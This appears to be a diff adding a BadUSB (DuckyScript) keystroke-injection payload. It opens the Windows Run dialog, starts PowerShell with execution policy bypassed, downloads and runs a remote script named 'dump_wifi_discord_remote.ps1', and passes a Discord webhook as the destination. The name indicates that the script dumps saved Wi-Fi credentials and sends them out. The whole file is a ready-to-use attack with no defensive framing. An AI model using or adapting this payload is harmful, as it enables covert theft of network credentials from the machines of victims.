@@ -1,0 +1,6 @@
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Vinniehat/BadUSB-Scripts/refs/heads/main/dump_wifi_discord_remote.ps1' -OutFile '$env:TEMP\dump_wifi_discord_remote.ps1'; powershell -ExecutionPolicy Bypass -File '$env:TEMP\dump_wifi_discord_remote.ps1' -webhookUrl 'https://discord.com/api/webhooks/XXXX/YYY'"
+ENTER
+STRING exit
+ENTER
